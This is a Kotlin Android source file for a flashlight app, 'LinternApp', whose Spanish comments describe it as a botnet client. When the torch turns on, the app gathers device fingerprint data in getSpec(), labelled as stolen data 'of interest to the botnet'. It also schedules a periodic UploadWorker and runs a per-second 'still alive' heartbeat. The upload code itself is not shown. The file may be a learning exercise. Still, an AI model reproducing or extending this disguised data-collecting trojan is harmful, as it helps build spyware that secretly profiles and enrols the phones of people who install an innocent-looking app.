package com.linternbot

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.support.v4.app.NotificationCompat
import android.support.v4.app.NotificationManagerCompat
import android.support.v7.app.ActionBar
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.view.View.INVISIBLE
import android.view.View.VISIBLE
import android.widget.ImageView
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val actionBar: ActionBar? = supportActionBar
        actionBar?.hide()
        val button = findViewById<ImageView>(R.id.boton1)
        val button2 = findViewById<ImageView>(R.id.boton2)
        button2.visibility = INVISIBLE

        // Para el envio de mensajes de Still Alive
        // Fuente: https://stackoverflow.com/questions/55570990/kotlin-call-a-function-every-second
        val mainHandler = Handler(Looper.getMainLooper())
        mainHandler.post(object : Runnable {
            override fun run() {
                Log.d("HELLO", "hello")
                mainHandler.postDelayed(this, 1000)
            }
        })

        // Codigo relaccionado con las notificaciones:
        // https://developer.android.com/training/notify-user/build-notification?hl=es-419
        // Contruye la notificacion, es decir, imagenes, textos, intent, etc.
        val builderEncendida = NotificationCompat.Builder(this, "1")
            .setSmallIcon(R.drawable.linterna)
            .setContentTitle("LinternApp")
            .setContentText("La linterna está encendida!")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            //.setContentIntent(pendingIntent)
            .setAutoCancel(false)
            .setOngoing(true) // Esta linea hace que el usuario no pueda cerrar la notificacion

        val builderApagada = NotificationCompat.Builder(this, "1")
            .setSmallIcon(R.drawable.linterna)
            .setContentTitle("LinternApp")
            .setContentText("La linterna está apagada!")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            //.setContentIntent(pendingIntent)
            .setAutoCancel(false)
            .setOngoing(true) // Esta linea hace que el usuario no pueda cerrar la notificacion

        createNotificationChannel() // Canal de comunicacion de notificaciones necesario en API 26+

        // Cuando la linterna está encendida
        button.setOnClickListener {
            if(button.visibility.equals(VISIBLE)){
                button.visibility = INVISIBLE
                button2.visibility = VISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0] // usualmente la camara delantera esta en la posicion 0
                try {
                    camManager.setTorchMode(cameraId, true)

                    // Envia la notificacion construida previamente
                    with(NotificationManagerCompat.from(this)) {
                        notify(1, builderEncendida.build())
                    }

                    // Imprime los datos robados para debug

                    Log.d("TAG",getSpec())

                    // Codigo para aprender a utilizar worker
                    // https://developer.android.com/reference/androidx/work/PeriodicWorkRequest
                    val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, 16, TimeUnit.MINUTES)

                    val myWork = myWorkBuilder.build()
                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.KEEP, myWork)


                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }
        button2.setOnClickListener { // LA LINTERNA ESTA APAGADA
            if (button2.visibility.equals(VISIBLE)) {
                button.visibility = VISIBLE
                button2.visibility = INVISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0]
                try {
                    camManager.setTorchMode(cameraId, false)
                    // Envia la notificacion construida previamente
                    with(NotificationManagerCompat.from(this)) {
                        notify(1, builderApagada.build())
                    }
                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }
    }

    // Crea el canal de notificaciones para API 26+
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Notificaciones"
            val descriptionText = "Canal de notificaciones"
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel("1", name, importance).apply {
                description = descriptionText
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }


    // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
    // Fuente: https://stackoverflow.com/questions/38624319/get-android-phone-specs-programmatically
    private fun getSpec() : String{
        var data = ""
        val fields = Build.VERSION_CODES::class.java.fields
        var codeName = "UNKNOWN"
        fields.filter { it.getInt(Build.VERSION_CODES::class) == Build.VERSION.SDK_INT }
            .forEach { codeName = it.name }
        data = data + "RELEASE AND CODENAME: " + Build.VERSION.RELEASE+codeName
        data = data +"MODEL: " + Build.MODEL+ "\n"
        data = data +"ID: " + Build.ID+ "\n"
        data = data +"Manufacture: " + Build.MANUFACTURER+ "\n"
        data = data +"brand: " + Build.BRAND+ "\n"
        data = data +"type: " + Build.TYPE+ "\n"
        data = data +"user: " + Build.USER+ "\n"
        data = data +"BASE: " + Build.VERSION_CODES.BASE+ "\n"
        data = data +"INCREMENTAL " + Build.VERSION.INCREMENTAL+ "\n"
        data = data +"SDK  " + Build.VERSION.SDK+ "\n"
        data = data +"BOARD: " + Build.BOARD+ "\n"
        data = data +"BRAND " + Build.BRAND+ "\n"
        data = data +"HOST " + Build.HOST+ "\n"
        data = data +"FINGERPRINT: "+Build.FINGERPRINT+ "\n"
        data = data +"Version Code: " + Build.VERSION.RELEASE+ "\n"
        return data
    }
}
